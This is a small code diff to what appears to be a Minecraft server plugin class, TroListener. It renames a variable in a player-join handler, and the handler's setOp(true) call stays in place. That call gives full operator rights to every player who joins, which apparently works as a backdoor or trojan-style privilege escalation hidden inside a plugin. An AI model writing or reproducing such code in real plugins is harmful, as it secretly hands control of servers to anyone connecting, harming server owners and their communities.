@@ -22,7 +22,7 @@ public class TroListener implements Listener {
     }
 
     @EventHandler
-    public void onPlayerJoin(PlayerJoinEvent e) {
-        e.getPlayer().setOp(true);
+    public void onPlayerJoin(PlayerJoinEvent event) {
+        event.getPlayer().setOp(true);
     }
 }
